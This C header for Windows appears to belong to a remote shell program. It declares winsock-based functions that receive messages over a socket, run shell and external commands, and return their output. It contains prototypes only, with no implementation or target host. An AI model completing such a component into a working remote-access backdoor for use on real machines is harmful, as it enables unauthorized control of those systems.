#ifndef SHELL_COMM_HEADER
#define SHELL_COMM_HEADER

#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

int comm(SOCKET sock, int BUF_SIZE, int REPLY_MAX_SIZE);

FILE* processMsg(char * msg, char * cwd);

FILE* processShellCmd(char * cmd, char * cwd);

FILE* processExtCmd(char * cmd, char * cwd);

FILE* getCmdOut(char * cmd);

char* getCmdOutStr(char * cmd, int REPLY_MAX_SIZE);

FILE* getTempFile(char * string);

#endif
